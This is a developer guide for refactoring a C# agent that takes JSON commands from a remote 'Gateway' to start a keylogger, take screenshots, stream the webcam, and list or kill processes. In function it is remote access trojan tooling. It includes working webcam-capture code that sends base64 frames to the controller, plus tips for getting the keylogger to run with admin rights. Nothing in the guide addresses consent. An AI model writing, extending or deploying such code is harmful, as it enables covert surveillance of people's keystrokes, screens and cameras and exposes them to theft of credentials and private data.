# ServerRefactor Integration Guide

## Overview

The `server.cs` file implements a modern WebSocket-based command handler architecture that replaces the old loop-based TCP socket approach. This guide explains how to integrate it with the existing application.

## Architecture Changes

### Old Architecture
- TCP Socket with text-based commands
- Nested loops for command modes
- Synchronous blocking I/O
- Complex state management with QUIT commands

### New Architecture (server.cs)
- WebSocket with JSON messages
- Flat command dispatch (event-driven)
- Async/await pattern
- Explicit state management

## Integration Steps

### 1. Modify Program.cs

Update the `MainAsync()` method to start the message listener:

```csharp
static async Task MainAsync()
{
    // ... existing configuration code ...

    bool connected = await ConnectToGatewayAsync(gatewayUrl);
    
    if (!connected)
    {
        MessageBox.Show($"Failed to connect to Gateway at {gatewayUrl}. The application will continue but may not function correctly.", 
            "Connection Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
    }
    else
    {
        Console.WriteLine("Successfully connected to Gateway.");
        
        // NEW: Start the refactored server message handler
        var serverRefactor = new ServerRefactor();
        _ = Task.Run(async () => await serverRefactor.StartListeningAsync(GatewayWebSocket));
    }

    Application.EnableVisualStyles();
    Application.SetCompatibleTextRenderingDefault(false);
    Application.Run(new server());
}
```

### 2. Alternative: Replace Form-Based UI

If you want to run the server as a console application instead of a Windows Form:

```csharp
static async Task MainAsync()
{
    // ... existing configuration and connection code ...

    if (connected)
    {
        Console.WriteLine("Successfully connected to Gateway.");
        
        // Start the refactored server
        var serverRefactor = new ServerRefactor();
        await serverRefactor.StartListeningAsync(GatewayWebSocket);
    }
}

static void Main()
{
    MainAsync().GetAwaiter().GetResult();
}
```

## Command Examples

### From Client (via Gateway)

All commands are sent as JSON messages over WebSocket:

#### Start Keylogger
```json
{
  "command": "KEYLOG_HOOK"
}
```

#### Capture Screenshot
```json
{
  "command": "TAKEPIC"
}
```

#### Kill Process
```json
{
  "command": "PROCESS_KILL",
  "processId": 1234
}
```

#### List Applications
```json
{
  "command": "APPLICATION_LIST"
}
```

#### Start Webcam (placeholder)
```json
{
  "command": "WEBCAM_START",
  "frameRate": 10
}
```

## Response Format

All responses follow a consistent schema:

### Success Response
```json
{
  "success": true,
  "message": "Operation completed",
  "data": "..."  // Optional data field
}
```

### Error Response
```json
{
  "success": false,
  "message": "Error description"
}
```

### Screenshot Response
```json
{
  "success": true,
  "format": "base64",
  "imageData": "iVBORw0KGgoAAAANSUhEUg..."
}
```

### Process List Response
```json
{
  "success": true,
  "count": 127,
  "processes": [
    {
      "name": "chrome",
      "processId": 1234,
      "threadCount": 45
    }
  ]
}
```

## Key Features

### 1. Event-Driven Architecture
- No nested loops or modes
- Each command is self-contained
- Clean separation of concerns

### 2. Async/Await Pattern
- Non-blocking I/O operations
- Better resource utilization
- Improved responsiveness

### 3. JSON-Based Communication
- Structured data exchange
- Easy to parse and validate
- Type-safe with proper error handling

### 4. State Management
- Explicit state tracking for keylogger (`isKeylogActive`)
- Explicit state tracking for webcam (`isWebcamActive`)
- No implicit state in call stack

### 5. Error Handling
- Consistent error response format
- Per-command try-catch blocks
- Connection-safe error handling

## Testing

### Using WebSocket Client Tools

You can test the server using tools like:
- **wscat**: `npm install -g wscat`
- **Postman**: WebSocket client
- **Browser Developer Console**: Native WebSocket API

Example test with JavaScript in browser console:

```javascript
// Connect to Gateway
const ws = new WebSocket('ws://localhost:8080');

ws.onopen = () => {
    console.log('Connected');
    
    // Register as web client
    ws.send(JSON.stringify({
        type: 'register',
        role: 'web'
    }));
    
    // Send command to agent
    ws.send(JSON.stringify({
        command: 'PROCESS_LIST'
    }));
};

ws.onmessage = (event) => {
    console.log('Response:', JSON.parse(event.data));
};
```

## Webcam Implementation Notes

The webcam functionality in `server.cs` is currently a placeholder. To implement full webcam support, you'll need to:

1. **Add NuGet Package** (choose one):
   - AForge.NET: `Install-Package AForge.Video.DirectShow`
   - OpenCvSharp: `Install-Package OpenCvSharp4`
   - Emgu.CV: `Install-Package Emgu.CV`

2. **Example with AForge.NET**:

```csharp
using AForge.Video.DirectShow;
using AForge.Video;

private VideoCaptureDevice videoCaptureDevice;

private async Task HandleWebcamStartAsync(JsonElement root)
{
    int frameRate = DEFAULT_WEBCAM_FPS;
    if (root.TryGetProperty("frameRate", out JsonElement frameRateElement))
    {
        frameRate = frameRateElement.GetInt32();
    }

    // Get list of video devices
    FilterInfoCollection videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
    
    if (videoDevices.Count == 0)
    {
        await SendJsonResponseAsync(new { 
            success = false, 
            message = "Webcam not found or access denied" 
        });
        return;
    }

    // Initialize first webcam
    videoCaptureDevice = new VideoCaptureDevice(videoDevices[0].MonikerString);
    videoCaptureDevice.NewFrame += async (sender, eventArgs) =>
    {
        await CaptureWebcamFrameAsync(eventArgs.Frame);
    };
    
    videoCaptureDevice.Start();
    isWebcamActive = true;

    await SendJsonResponseAsync(new { 
        success = true, 
        message = "Webcam streaming started",
        frameRate = frameRate
    });
}

private async Task CaptureWebcamFrameAsync(Bitmap frame)
{
    using (MemoryStream ms = new MemoryStream())
    {
        frame.Save(ms, ImageFormat.Jpeg);
        byte[] frameBytes = ms.ToArray();
        
        var frameMessage = new
        {
            type = "WEBCAM_FRAME",
            format = "jpeg",
            frameData = Convert.ToBase64String(frameBytes)
        };

        await SendJsonResponseAsync(frameMessage);
    }
}
```

## Migration Checklist

- [ ] Update Program.cs to use ServerRefactor
- [ ] Test all command types (keylog, screenshot, process, application)
- [ ] Update client code to send JSON commands instead of text
- [ ] Update Gateway routing if needed
- [ ] Test error handling and edge cases
- [ ] (Optional) Implement webcam support with video library
- [ ] Remove old legacy server code after migration is complete

## Benefits Over Old Implementation

1. **Maintainability**: Flat command structure is easier to understand and modify
2. **Extensibility**: Adding new commands is straightforward
3. **Reliability**: Better error handling and connection management
4. **Performance**: Async operations don't block threads
5. **Modern**: Uses current best practices (async/await, JSON, WebSocket)
6. **Testability**: Each command handler can be tested independently

## Troubleshooting

### Issue: WebSocket connection fails
- Check Gateway is running and listening on correct port
- Verify firewall allows WebSocket connections
- Check `Gateway:WebSocketUrl` in appsettings.json or .env

### Issue: Commands not executing
- Verify JSON format is correct
- Check server console for error messages
- Ensure command name matches exactly (case-sensitive)

### Issue: Keylogger not working
- Run application with administrator privileges
- Check keylog file path is writable
- Verify keylogger thread is not blocked

### Issue: Process/Application commands fail
- Ensure sufficient permissions to kill/start processes
- Check process name includes/excludes .exe as appropriate
- Some system processes may be protected

## Next Steps

1. Test the refactored implementation thoroughly
2. Migrate client code to use JSON commands
3. Consider adding authentication/authorization
4. Implement rate limiting for security
5. Add logging for debugging and audit trails

